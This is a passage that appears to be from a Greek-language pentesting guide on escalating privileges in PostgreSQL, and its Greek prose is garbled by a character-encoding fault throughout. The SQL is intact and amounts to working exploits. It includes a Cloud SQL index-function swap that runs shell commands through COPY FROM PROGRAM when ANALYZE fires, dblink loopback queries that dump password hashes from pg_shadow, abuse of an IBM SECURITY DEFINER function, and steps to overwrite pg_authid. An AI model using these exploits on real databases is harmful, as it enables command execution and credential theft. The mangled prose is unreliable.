ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ Ï„Î¿ ANALYZE ÏƒÏ„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ± Î¼Îµ Ï„Î·Î½ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Ï€Î¿Ï… Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ ÎµÎ½Ï„Î¿Î»Î­Ï‚ ÎµÏ€ÎµÎ¹Î´Î® Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Ï„Î¿Ï… Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„Î·.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·

1. ÎÎµÎºÎ¹Î½Î®ÏƒÏ„Îµ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÏÎ½Ï„Î±Ï‚ Î­Î½Î±Î½ Î½Î­Î¿ Ï€Î¯Î½Î±ÎºÎ±.
2. Î•Î¹ÏƒÎ¬Î³ÎµÏ„Îµ Î¼ÎµÏÎ¹ÎºÏŒ Î±Î½ÎµÏ€Î¯ÎºÎ±Î¹ÏÎ¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ ÏƒÏ„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ± Î³Î¹Î± Î½Î± Ï€Î±ÏÎ­Ï‡ÎµÏ„Îµ Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î³Î¹Î± Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Ï„Î¿Ï… Î´ÎµÎ¯ÎºÏ„Î·.
3. Î‘Î½Î±Ï€Ï„ÏÎ¾Ï„Îµ Î¼Î¹Î± ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Î´ÎµÎ¯ÎºÏ„Î· Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î­Î½Î± Ï†Î¿ÏÏ„Î¯Î¿ ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚ ÎºÏÎ´Î¹ÎºÎ±, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Ï‰Î½ ÎµÎ½Ï„Î¿Î»ÏÎ½.
4. Î‘Î»Î»Î¬Î¾Ï„Îµ Ï„Î¿Î½ Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„Î· Ï„Î¿Ï… Ï€Î¯Î½Î±ÎºÎ± ÏƒÎµ "cloudsqladmin," Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î¿ ÏÏŒÎ»Î¿Ï‚ Ï…Ï€ÎµÏÏ‡ÏÎ®ÏƒÏ„Î· Ï„Î¿Ï… GCP Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ Î±Ï€ÏŒ Ï„Î¿ Cloud SQL Î³Î¹Î± Ï„Î· Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· ÎºÎ±Î¹ ÏƒÏ…Î½Ï„Î®ÏÎ·ÏƒÎ· Ï„Î·Ï‚ Î²Î¬ÏƒÎ·Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½.
5. Î•ÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ Î¼Î¹Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± ANALYZE ÏƒÏ„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ±. Î‘Ï…Ï„Î® Î· ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± Ï…Ï€Î¿Ï‡ÏÎµÏÎ½ÎµÎ¹ Ï„Î· Î¼Î·Ï‡Î±Î½Î® PostgreSQL Î½Î± Î¼ÎµÏ„Î±Î²ÎµÎ¯ ÏƒÏ„Î¿ Ï€Î»Î±Î¯ÏƒÎ¹Î¿ Ï‡ÏÎ®ÏƒÏ„Î· Ï„Î¿Ï… Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„Î· Ï„Î¿Ï… Ï€Î¯Î½Î±ÎºÎ±, "cloudsqladmin." Î©Ï‚ ÎµÎº Ï„Î¿ÏÏ„Î¿Ï…, Î· ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Î´ÎµÎ¯ÎºÏ„Î· ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ Î¼Îµ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Ï„Î¿Ï… "cloudsqladmin," ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Î­Ï„ÏƒÎ¹ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î·Ï‚ Ï€ÏÎ¿Î·Î³Î¿Ï…Î¼Î­Î½Ï‰Ï‚ Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î·Ï‚ ÎµÎ½Ï„Î¿Î»Î®Ï‚ ÎºÎ­Î»Ï…Ï†Î¿Ï…Ï‚.

Î£Ï„Î· PostgreSQL, Î±Ï…Ï„Î® Î· ÏÎ¿Î® Î¼Î¿Î¹Î¬Î¶ÎµÎ¹ ÎºÎ¬Ï€Ï‰Ï‚ Î­Ï„ÏƒÎ¹:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Î¤ÏŒÏ„Îµ, Î¿ Ï€Î¯Î½Î±ÎºÎ±Ï‚ `shell_commands_results` Î¸Î± Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î¿ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î± Ï„Î¿Ï… ÎµÎºÏ„ÎµÎ»ÎµÏƒÎ¼Î­Î½Î¿Ï… ÎºÏÎ´Î¹ÎºÎ±:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Î¤Î¿Ï€Î¹ÎºÎ® Î£ÏÎ½Î´ÎµÏƒÎ·

ÎšÎ¬Ï€Î¿Î¹ÎµÏ‚ Î»Î±Î½Î¸Î±ÏƒÎ¼Î­Î½Î± Î´Î¹Î±Î¼Î¿ÏÏ†Ï‰Î¼Î­Î½ÎµÏ‚ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… postgresql Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ Ï„Î· ÏƒÏÎ½Î´ÎµÏƒÎ· Î¿Ï€Î¿Î¹Î¿Ï…Î´Î®Ï€Î¿Ï„Îµ Ï„Î¿Ï€Î¹ÎºÎ¿Ï Ï‡ÏÎ®ÏƒÏ„Î·, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î® Î· Ï„Î¿Ï€Î¹ÎºÎ® ÏƒÏÎ½Î´ÎµÏƒÎ· Î±Ï€ÏŒ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· 127.0.0.1 Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î· **ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· `dblink`**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î³Î¹Î± Ï„Î¿ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿ ÎµÏÏÏ„Î·Î¼Î± Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ **Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± `dblink` Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï…Ï€Î¬ÏÏ‡ÎµÎ¹**. Î‘Î½ Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î¼Îµ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î®:
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

Î‘Î½ Î­Ï‡ÎµÏ„Îµ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÎµÎ½ÏŒÏ‚ Ï‡ÏÎ®ÏƒÏ„Î· Î¼Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±, Î±Î»Î»Î¬ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î´ÎµÎ½ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÏ„Î±Î¹ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯ Î±Ï€ÏŒ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ® Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· IP, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ ÎµÏÏ‰Ï„Î®Î¼Î±Ï„Î± Ï‰Ï‚ Î±Ï…Ï„ÏŒÏ‚ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î±Î½ Î±Ï…Ï„Î® Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î¼Îµ:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Î ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î· Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Î¼Îµ** SECURITY DEFINER

[**Î£Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Î¬ÏÎ¸ÏÎ¿**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), Î¿Î¹ pentesters ÎºÎ±Ï„Î¬Ï†ÎµÏÎ±Î½ Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± ÎµÎ½Ï„ÏŒÏ‚ ÎµÎ½ÏŒÏ‚ Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î¿Ï‚ postgres Ï€Î¿Ï… Ï€Î±ÏÎ­Ï‡ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î·Î½ IBM, ÎµÏ€ÎµÎ¹Î´Î® **Î²ÏÎ®ÎºÎ±Î½ Î±Ï…Ï„Î®Î½ Ï„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Î¼Îµ Ï„Î· ÏƒÎ·Î¼Î±Î¯Î± SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
â€¦
</code></pre>

ÎŒÏ€Ï‰Ï‚ [**ÎµÎ¾Î·Î³ÎµÎ¯Ï„Î±Î¹ ÏƒÏ„Î± Î­Î³Î³ÏÎ±Ï†Î±**](https://www.postgresql.org/docs/current/sql-createfunction.html) Î¼Î¹Î± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Î¼Îµ **SECURITY DEFINER ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹** Î¼Îµ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Ï„Î¿Ï… **Ï‡ÏÎ®ÏƒÏ„Î· Ï€Î¿Ï… Ï„Î·Î½ ÎºÎ±Ï„Î­Ï‡ÎµÎ¹**. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î±Î½ Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· ÎµÎ¯Î½Î±Î¹ **ÎµÏ…Î¬Î»Ï‰Ï„Î· ÏƒÏ„Î·Î½ ÎµÎ¹ÏƒÏ‡ÏÏÎ·ÏƒÎ· SQL** Î® ÎµÎºÏ„ÎµÎ»ÎµÎ¯ ÎºÎ¬Ï€Î¿Î¹ÎµÏ‚ **Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡ÎµÏ‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ Î¼Îµ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚ Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ ÎµÎ¹ÏƒÎ²Î¿Î»Î­Î±**, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯ Î³Î¹Î± Î½Î± **Î±Î½Î±Î²Î±Î¸Î¼Î¯ÏƒÎµÎ¹ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ postgres**.

Î£Ï„Î· Î³ÏÎ±Î¼Î¼Î® 4 Ï„Î¿Ï… Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿Ï… ÎºÏÎ´Î¹ÎºÎ± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Î­Ï‡ÎµÎ¹ Ï„Î· **ÏƒÎ·Î¼Î±Î¯Î± SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
ÎšÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ ÎµÎ½Ï„Î¿Î»Î­Ï‚**:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### Î”Î¹ÎµÎ¯ÏƒÎ´Ï…ÏƒÎ· Î¼Îµ brute force Î¼Îµ Ï„Î¿ PL/pgSQL

Î¤Î¿ **PL/pgSQL** ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± **Ï€Î»Î®ÏÏ‰Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÎ® Î³Î»ÏÏƒÏƒÎ± Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÎ¼Î¿Ï** Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÏ†Î­ÏÎµÎ¹ Î¼ÎµÎ³Î±Î»ÏÏ„ÎµÏÎ¿ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÏ„Î¹ÎºÏŒ Î­Î»ÎµÎ³Ï‡Î¿ ÏƒÎµ ÏƒÏÎ³ÎºÏÎ¹ÏƒÎ· Î¼Îµ Ï„Î·Î½ SQL. Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î· Ï‡ÏÎ®ÏƒÎ· **Î²ÏÏŒÏ‡Ï‰Î½** ÎºÎ±Î¹ Î¬Î»Î»Ï‰Î½ **Î´Î¿Î¼ÏÎ½ ÎµÎ»Î­Î³Ï‡Î¿Ï…** Î³Î¹Î± Ï„Î· Î²ÎµÎ»Ï„Î¯Ï‰ÏƒÎ· Ï„Î·Ï‚ Î»Î¿Î³Î¹ÎºÎ®Ï‚ Ï„Î¿Ï… Ï€ÏÎ¿Î³ÏÎ¬Î¼Î¼Î±Ï„Î¿Ï‚. Î•Ï€Î¹Ï€Î»Î­Î¿Î½, **Î¿Î¹ Î´Î·Î»ÏÏƒÎµÎ¹Ï‚ SQL** ÎºÎ±Î¹ **Î¿Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Ï„Î­Ï‚ (triggers)** Î­Ï‡Î¿Ï…Î½ Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± Î½Î± ÎºÎ±Î»Î¿ÏÎ½ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¿ÏÎ½Ï„Î±Î¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î· **Î³Î»ÏÏƒÏƒÎ± PL/pgSQL**. Î‘Ï…Ï„Î® Î· Î¿Î»Î¿ÎºÎ»Î®ÏÏ‰ÏƒÎ· ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î¼Î¹Î± Ï€Î¹Î¿ Ï€ÎµÏÎ¹ÎµÎºÏ„Î¹ÎºÎ® ÎºÎ±Î¹ ÎµÏ…Î­Î»Î¹ÎºÏ„Î· Ï€ÏÎ¿ÏƒÎ­Î³Î³Î¹ÏƒÎ· ÏƒÏ„Î¿Î½ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÎ¼ÏŒ ÎºÎ±Î¹ Ï„Î·Î½ Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î·Ï‚ Î²Î¬ÏƒÎ·Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½.\
**ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Î±Ï…Ï„Î®Î½ Ï„Î· Î³Î»ÏÏƒÏƒÎ± Î³Î¹Î± Î½Î± Î¶Î·Ï„Î®ÏƒÎµÏ„Îµ Î±Ï€ÏŒ Ï„Î¿ PostgreSQL Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÎ¹ Î¼Îµ brute force Ï„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Ï„Ï‰Î½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

### Î‘Î½ÏÏˆÏ‰ÏƒÎ· Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ Î¼Îµ Ï„Î¿Î½ Î‘Î½Ï„Î¹ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Î•ÏƒÏ‰Ï„ÎµÏÎ¹ÎºÏÎ½ Î Î¹Î½Î¬ÎºÏ‰Î½ Ï„Î¿Ï… PostgreSQL

{% hint style="info" %}
Î¤Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î´Î¹Î¬Î½Ï…ÏƒÎ¼Î± Î±Î½ÏÏˆÏ‰ÏƒÎ·Ï‚ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ ÎµÎ¯Î½Î±Î¹ Î¹Î´Î¹Î±Î¯Ï„ÎµÏÎ± Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿ ÏƒÎµ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î± Ï€Î»Î±Î¯ÏƒÎ¹Î± SQLi, ÎºÎ±Î¸ÏÏ‚ ÏŒÎ»Î± Ï„Î± Î²Î®Î¼Î±Ï„Î± Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î¼Î­ÏƒÏ‰ ÎµÎ¼Ï†Ï‰Î»ÎµÏ…Î¼Î­Î½Ï‰Î½ Î´Î·Î»ÏÏƒÎµÏ‰Î½ SELECT
{% endhint %}

Î‘Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ **Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ ÎºÎ±Î¹ Î½Î± Î³ÏÎ¬ÏˆÎµÏ„Îµ Î±ÏÏ‡ÎµÎ¯Î± ÎµÎ¾Ï…Ï€Î·ÏÎµÏ„Î·Ï„Î® PostgreSQL**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ **Î½Î± Î³Î¯Î½ÎµÏ„Îµ Ï…Ï€ÎµÏÏ‡ÏÎ®ÏƒÏ„Î·Ï‚** Î¼Îµ Ï„Î¿Î½ Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î¬Ï„Î· Ï„Î¿Ï… PostgreSQL ÏƒÏ„Î¿Î½ Î´Î¯ÏƒÎºÎ¿, Ï€Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶ÎµÏ„Î±Î¹ Î¼Îµ Ï„Î¿Î½ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÏŒ Ï€Î¯Î½Î±ÎºÎ± `pg_authid`.

Î”Î¹Î±Î²Î¬ÏƒÏ„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Î³Î¹Î± **Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Ï„ÎµÏ‡Î½Î¹ÎºÎ®** [**ÎµÎ´Ï**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

Î¤Î± Î²Î®Î¼Î±Ï„Î± Ï„Î·Ï‚ ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚ ÎµÎ¯Î½Î±Î¹:

1. Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿Î½ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Ï„Î¿Ï… PostgreSQL
2. Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Î­Î½Î± ÏƒÏ‡ÎµÏ„Î¹ÎºÏŒ Î¼Î¿Î½Î¿Ï€Î¬Ï„Î¹ Ï€ÏÎ¿Ï‚ Ï„Î¿Î½ ÎºÏŒÎ¼Î²Î¿ Î±ÏÏ‡ÎµÎ¯Î¿Ï…, Ï€Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶ÎµÏ„Î±Î¹ Î¼Îµ Ï„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ± `pg_authid`
3. ÎšÎ±Ï„ÎµÎ²Î¬ÏƒÏ„Îµ Ï„Î¿Î½ ÎºÏŒÎ¼Î²Î¿ Î±ÏÏ‡ÎµÎ¯Î¿Ï… Î¼Î­ÏƒÏ‰ Ï„Ï‰Î½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÏÎ½ `lo_*`
4. Î›Î¬Î²ÎµÏ„Îµ Ï„Î¿Î½ Ï„ÏÏ€Î¿ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½, Ï€Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶ÎµÏ„Î±Î¹ Î¼Îµ Ï„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ± `pg_authid`
5. Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ [Î•Ï€ÎµÎ¾ÎµÏÎ³Î±ÏƒÏ„Î® ÎšÏŒÎ¼Î²Î¿Ï… Î‘ÏÏ‡ÎµÎ¯Î¿Ï… PostgreSQL](https://github.com/adeadfed/postgresql-filenode-editor) Î³Î¹Î± Î½Î± [ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î¿Î½ ÎºÏŒÎ¼Î²Î¿ Î±ÏÏ‡ÎµÎ¯Î¿Ï…](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg\_authid-table); Î¿ÏÎ¯ÏƒÏ„Îµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Î»Î¿Î³Î¹ÎºÎ­Ï‚ ÏƒÎ·Î¼Î±Î¯ÎµÏ‚ `rol*` ÏƒÎµ 1 Î³Î¹Î± Ï€Î»Î®ÏÎ· Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±.
6. Î•Ï€Î±Î½Î±Ï†Î¿ÏÏ„ÏÏƒÏ„Îµ Ï„Î¿Î½ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¼Î­Î½Î¿ ÎºÏŒÎ¼Î²Î¿ Î±ÏÏ‡ÎµÎ¯Î¿Ï… Î¼Î­ÏƒÏ‰ Ï„Ï‰Î½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÏÎ½ `lo_*`, ÎºÎ±Î¹ Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÏ„Îµ Ï„Î¿ Î±ÏÏ‡Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ ÏƒÏ„Î¿ Î´Î¯ÏƒÎºÎ¿
